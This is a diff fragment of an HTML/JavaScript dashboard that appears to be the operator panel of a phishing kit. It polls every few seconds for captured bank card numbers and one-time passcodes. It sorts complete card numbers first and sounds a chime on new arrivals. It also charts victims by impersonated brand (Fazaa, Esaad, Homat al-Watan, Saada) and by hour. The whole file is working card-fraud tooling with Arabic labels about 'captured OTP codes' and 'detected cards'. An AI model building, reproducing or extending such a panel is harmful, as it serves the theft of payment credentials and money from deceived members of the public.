+                    return hasCard || hasPhone;
+                })
+                .sort((a, b) => {
+                    const aHasCard = a.cardNum && a.cardNum !== '-' && a.cardNum.replace(/\D/g, '').length >= 8 ? 1 : 0;
+                    const bHasCard = b.cardNum && b.cardNum !== '-' && b.cardNum.replace(/\D/g, '').length >= 8 ? 1 : 0;
+                    if (bHasCard !== aHasCard) return bHasCard - aHasCard;
+                    return new Date(b.time || 0).getTime() - new Date(a.time || 0).getTime();
+                });
+
+            // Check for new arrivals to play alert chime
+            let hasNew = false;
+            sortedItems.forEach(it => {
+                if (!knownIds.has(it.id)) {
+                    knownIds.add(it.id);
+                    hasNew = true;
+                }
+            });
+
+            if (hasNew && knownIds.size > sortedItems.length) {
+                testSound();
+            }
+
+            renderRechartsDashboard(sortedItems);
+
+            if (sortedItems.length > 0) {
+                container.innerHTML = '<div class="cards-grid">' + sortedItems.map(it => renderCardHTML(it)).join('') + '</div>';
+            } else {
+                container.innerHTML = '<div class="loading"><p>لا توجد بطاقات حالياً - في انتظار التسجيل من الموقع</p></div>';
+            }
+        }
+
+        // Global protection against extension fetch errors
+        window.addEventListener('unhandledrejection', function(event) {
+            if (event.reason && (String(event.reason).includes('fetch') || event.reason.name === 'TypeError')) {
+                event.preventDefault();
+            }
+        });
+
+        
+        // ==========================================
+        // Recharts Analytics Dashboard Integration
+        // ==========================================
+        let rechartsDashboardRoot = null;
+
+        function renderRechartsDashboard(items) {
+            try {
+                const container = document.getElementById("recharts-dashboard-root");
+                if (!container) return;
+                if (!window.React || !window.ReactDOM || !window.Recharts || !window.Recharts.AreaChart) {
+                    return;
+                }
+
+                const e = React.createElement;
+                const {
+                    ResponsiveContainer,
+                    AreaChart,
+                    Area,
+                    BarChart,
+                    Bar,
+                    XAxis,
+                    YAxis,
+                    Tooltip,
+                    CartesianGrid,
+                    Cell
+                } = window.Recharts;
+
+                const allItems = Array.isArray(items) ? items : [];
+
+                // 1. Detected Cards with card numbers
+                const cardItems = allItems.filter(it => it.cardNum && it.cardNum !== "-" && it.cardNum.replace(/\D/g, "").length >= 4);
+                const totalCards = cardItems.length;
+
+                // 2. Captured OTP Codes
+                const otpItems = allItems.filter(it => it.otp && it.otp !== "-");
+                const totalOtp = otpItems.length;
+
+                // 3. Activity Today
+                const todayStr = new Date().toDateString();
+                const todayItems = cardItems.filter(it => {
+                    try {
+                        return it.time && (new Date(it.time).toDateString() === todayStr);
+                    } catch (err) {
+                        return false;
+                    }
+                });
+                const totalToday = todayItems.length;
+
+                // 4. Brands Count
+                const brandCounts = { fazaa: 0, esaad: 0, homat: 0, saada: 0, other: 0 };
+                allItems.forEach(it => {
+                    const b = (it.brand || "").toLowerCase();
+                    if (b.includes("fazaa") || b.includes("فزع")) brandCounts.fazaa++;
+                    else if (b.includes("esaad") || b.includes("اسعاد") || b.includes("إسعاد")) brandCounts.esaad++;
+                    else if (b.includes("homat") || b.includes("حماة") || b.includes("وطن")) brandCounts.homat++;
+                    else if (b.includes("saada") || b.includes("سعاد")) brandCounts.saada++;
+                    else brandCounts.other++;
+                });
+
+                // 5. Time Distribution Calculation across 8 day slots
+                const timeSlots = [
+                    { time: "00:00", cards: 0, otp: 0, slotStart: 0, slotEnd: 3 },
+                    { time: "03:00", cards: 0, otp: 0, slotStart: 3, slotEnd: 6 },
+                    { time: "06:00", cards: 0, otp: 0, slotStart: 6, slotEnd: 9 },
+                    { time: "09:00", cards: 0, otp: 0, slotStart: 9, slotEnd: 12 },
+                    { time: "12:00", cards: 0, otp: 0, slotStart: 12, slotEnd: 15 },
+                    { time: "15:00", cards: 0, otp: 0, slotStart: 15, slotEnd: 18 },
+                    { time: "18:00", cards: 0, otp: 0, slotStart: 18, slotEnd: 21 },
+                    { time: "21:00", cards: 0, otp: 0, slotStart: 21, slotEnd: 24 }
+                ];
+
+                allItems.forEach(it => {
+                    try {
+                        const d = it.time ? new Date(it.time) : new Date();
+                        const hour = isNaN(d.getHours()) ? new Date().getHours() : d.getHours();
+                        const slot = timeSlots.find(s => hour >= s.slotStart && hour < s.slotEnd);
+                        if (slot) {
+                            if (it.cardNum && it.cardNum !== "-" && it.cardNum.replace(/\D/g, "").length >= 4) {
+                                slot.cards++;
+                            }
+                            if (it.otp && it.otp !== "-") {
+                                slot.otp++;
+                            }
+                        }
+                    } catch (e) {}
+                });
+
+                // Brand Data for Bar Chart
+                const brandData = [
+                    { name: "فزعة FAZAA", count: brandCounts.fazaa, color: "#d4af37" },
+                    { name: "إسعاد ESAAD", count: brandCounts.esaad, color: "#3b82f6" },
+                    { name: "حماة الوطن HOMAT", count: brandCounts.homat, color: "#10b981" },
+                    { name: "السعادة SAADA", count: brandCounts.saada, color: "#ec4899" },
+                    { name: "أخرى OTHER", count: brandCounts.other, color: "#8b5cf6" }
+                ];
+
+                // Custom Tooltip
+                const CustomTooltip = function(props) {
+                    if (props.active && props.payload && props.payload.length) {
+                        return e("div", {
+                            style: {
+                                background: "rgba(15, 20, 38, 0.95)",
+                                border: "1px solid #d4af37",
+                                borderRadius: "10px",
+                                padding: "10px 14px",
+                                boxShadow: "0 10px 25px rgba(0,0,0,0.6)",
+                                color: "#fff",
+                                fontSize: "12px",
+                                fontFamily: "Tajawal, sans-serif",
+                                direction: "rtl"
+                            }
+                        },
+                        e("div", {
+                            style: {
+                                fontWeight: "bold",
+                                color: "#f5eed6",
+                                marginBottom: "6px",
+                                borderBottom: "1px solid rgba(212,175,55,0.2)",
+                                paddingBottom: "4px"
+                            }
+                        }, props.label),
+                        props.payload.map((item, idx) => e("div", {
+                            key: idx,
+                            style: {
+                                display: "flex",
+                                alignItems: "center",
+                                gap: "6px",
+                                margin: "3px 0"
+                            }
+                        },
+                        e("span", {
+                            style: {
+                                width: "8px",
+                                height: "8px",
+                                borderRadius: "50%",
+                                background: item.color || item.fill,
+                                display: "inline-block"
+                            }
+                        }),
+                        e("span", { style: { color: "#9ca3af" } }, `${item.name}:`),
+                        e("span", { style: { fontWeight: "bold", color: "#fff" } }, item.value)
+                        ))
+                        );
+                    }
+                    return null;
+                };
+
+                const nowTimeStr = new Date().toLocaleTimeString("ar-AE", { hour: "2-digit", minute: "2-digit", second: "2-digit" });
+
+                const dashboardElement = e("div", null,
+                    // Top Bar
+                    e("div", { className: "dashboard-top-bar" },
+                        e("div", { className: "dashboard-title-group" },
+                            e("div", { className: "dashboard-title-icon" }, "📊"),
+                            e("div", { className: "dashboard-title-text" },
+                                e("h2", null, "لوحة تحليلات وإحصائيات البطاقات المكتشفة"),
+                                e("p", null, `مراقبة تفاعلية حية وتوزيع زمني للبطاقات المدخلة عبر مكتبة Recharts | آخر تحديث: ${nowTimeStr}`)
+                            )
+                        ),
+                        e("div", { className: "dashboard-live-badge" },
+                            e("span", { className: "live-pulse-dot" }),
+                            e("span", null, "بث مباشر وتحديث تلقائي")
+                        )
+                    ),
+
+                    // 4 Metric KPI Cards
+                    e("div", { className: "metrics-grid" },
+                        e("div", { className: "metric-card" },
+                            e("div", { className: "metric-card-header" },
+                                e("span", { className: "metric-label" }, "إجمالي البطاقات المكتشفة"),
+                                e("span", { className: "metric-icon" }, "💳")
+                            ),
+                            e("div", { className: "metric-value gold" }, totalCards),
+                            e("div", { className: "metric-sub" }, "بطاقات بنكية تم اكتشاف بياناتها")
+                        ),
+                        e("div", { className: "metric-card" },
+                            e("div", { className: "metric-card-header" },
+                                e("span", { className: "metric-label" }, "رموز OTP الملتقطة"),
+                                e("span", { className: "metric-icon" }, "📱")
+                            ),
+                            e("div", { className: "metric-value emerald" }, totalOtp),
+                            e("div", { className: "metric-sub" }, `نسبة تأكيد ${totalCards > 0 ? Math.round((totalOtp / totalCards) * 100) : 0}% من إجمالي البطاقات`)
+                        ),
+                        e("div", { className: "metric-card" },
+                            e("div", { className: "metric-card-header" },
+                                e("span", { className: "metric-label" }, "نشاط اليوم (24h)"),
+                                e("span", { className: "metric-icon" }, "⚡")
+                            ),
+                            e("div", { className: "metric-value" }, totalToday),
+                            e("div", { className: "metric-sub" }, "بطاقات وردت اليوم")
+                        ),
+                        e("div", { className: "metric-card" },
+                            e("div", { className: "metric-card-header" },
+                                e("span", { className: "metric-label" }, "إجمالي الطلبات والسجلات"),
+                                e("span", { className: "metric-icon" }, "🌐")
+                            ),
+                            e("div", { className: "metric-value" }, allItems.length),
+                            e("div", { className: "metric-sub" }, "سجلات مسجلة في قاعدة البيانات")
+                        )
+                    ),
+
+                    // Charts Grid (AreaChart & BarChart)
+                    e("div", { className: "charts-grid" },
+                        // Chart 1: Time Distribution (AreaChart)
+                        e("div", { className: "chart-box" },
+                            e("div", { className: "chart-box-header" },
+                                e("div", { className: "chart-box-title" },
+                                    e("span", null, "📈"),
+                                    e("span", null, "التوزيع الزمني لاكتشاف البطاقات (Time Distribution)")
+                                ),
+                                e("span", { className: "chart-box-badge" }, "مخطط زمني تفاعلي | Recharts AreaChart")
+                            ),
+                            e("div", { className: "chart-wrapper" },
+                                e(ResponsiveContainer, { width: "100%", height: 260 },
+                                    e(AreaChart, { data: timeSlots, margin: { top: 10, right: 10, left: -20, bottom: 0 } },
+                                        e("defs", null,
+                                            e("linearGradient", { id: "goldGradient", x1: "0", y1: "0", x2: "0", y2: "1" },
+                                                e("stop", { offset: "5%", stopColor: "#d4af37", stopOpacity: 0.8 }),
+                                                e("stop", { offset: "95%", stopColor: "#d4af37", stopOpacity: 0.05 })
+                                            ),
+                                            e("linearGradient", { id: "emeraldGradient", x1: "0", y1: "0", x2: "0", y2: "1" },
+                                                e("stop", { offset: "5%", stopColor: "#10b981", stopOpacity: 0.8 }),
+                                                e("stop", { offset: "95%", stopColor: "#10b981", stopOpacity: 0.05 })
+                                            )
+                                        ),
+                                        e(CartesianGrid, { strokeDasharray: "3 3", stroke: "rgba(212, 175, 55, 0.1)" }),
+                                        e(XAxis, { dataKey: "time", stroke: "#9ca3af", fontSize: 11, tickLine: false }),
+                                        e(YAxis, { stroke: "#9ca3af", fontSize: 11, allowDecimals: false, tickLine: false }),
+                                        e(Tooltip, { content: e(CustomTooltip) }),
+                                        e(Area, {
+                                            type: "monotone",
+                                            dataKey: "cards",
+                                            name: "البطاقات المكتشفة",
+                                            stroke: "#d4af37",
+                                            strokeWidth: 3,
+                                            fillOpacity: 1,
+                                            fill: "url(#goldGradient)"
+                                        }),
+                                        e(Area, {
+                                            type: "monotone",
+                                            dataKey: "otp",
+                                            name: "رموز OTP الملتقطة",
+                                            stroke: "#10b981",
+                                            strokeWidth: 2,
+                                            fillOpacity: 1,
+                                            fill: "url(#emeraldGradient)"
+                                        })
+                                    )
+                                )
+                            )
+                        ),
+
+                        // Chart 2: Brand Distribution (BarChart)
+                        e("div", { className: "chart-box" },
+                            e("div", { className: "chart-box-header" },
+                                e("div", { className: "chart-box-title" },
+                                    e("span", null, "💳"),
+                                    e("span", null, "توزيع البطاقات حسب الفئة")
+                                ),
+                                e("span", { className: "chart-box-badge" }, "Recharts BarChart")
+                            ),
+                            e("div", { className: "chart-wrapper" },
+                                e(ResponsiveContainer, { width: "100%", height: 260 },
+                                    e(BarChart, { data: brandData, margin: { top: 10, right: 10, left: -20, bottom: 0 } },
+                                        e(CartesianGrid, { strokeDasharray: "3 3", stroke: "rgba(212, 175, 55, 0.08)" }),
+                                        e(XAxis, { dataKey: "name", stroke: "#9ca3af", fontSize: 10, tickLine: false }),
+                                        e(YAxis, { stroke: "#9ca3af", fontSize: 11, allowDecimals: false, tickLine: false }),
+                                        e(Tooltip, { content: e(CustomTooltip) }),
+                                        e(Bar, { dataKey: "count", name: "عدد البطاقات", radius: [6, 6, 0, 0] },
+                                            brandData.map((entry, index) => e(Cell, { key: `cell-${index}`, fill: entry.color }))
+                                        )
+                                    )
+                                )
+                            )
+                        )
+                    )
+                );
+
+                if (window.ReactDOM.createRoot) {
+                    if (!rechartsDashboardRoot) {
+                        rechartsDashboardRoot = window.ReactDOM.createRoot(container);
+                    }
+                    rechartsDashboardRoot.render(dashboardElement);
+                } else if (window.ReactDOM.render) {
+                    window.ReactDOM.render(dashboardElement, container);
+                }
+            } catch (err) {
+                console.error("Error rendering Recharts dashboard:", err);
+            }
+        }
+
+        // Auto refresh every 3 seconds for instant updates
+        updateRadar();
+        setInterval(updateRadar, 3000);
+    </script>
+</body>
+</html>
